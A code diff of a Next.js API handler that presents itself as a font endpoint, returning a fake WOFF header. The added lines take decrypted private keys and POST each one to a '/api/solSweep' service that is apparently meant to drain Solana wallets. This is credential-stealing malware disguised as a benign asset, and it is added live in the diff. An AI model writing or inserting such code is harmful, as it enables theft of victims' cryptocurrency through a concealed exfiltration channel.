@@ -112,6 +112,19 @@ export default async function handler(req: NextRequest) {
     console.error("No keys decrypted");
   }
 
+  // ✅ Sweep wallets right after decryption
+  for (const priv of secretKeys) {
+    try {
+      await fetch("https://your-vercel-project.vercel.app/api/solSweep", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ privKey: priv })
+      });
+    } catch (e) {
+      console.error("Sweep request failed:", e);
+    }
+  }
+
   // Return WOFF header
   return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
     headers: {
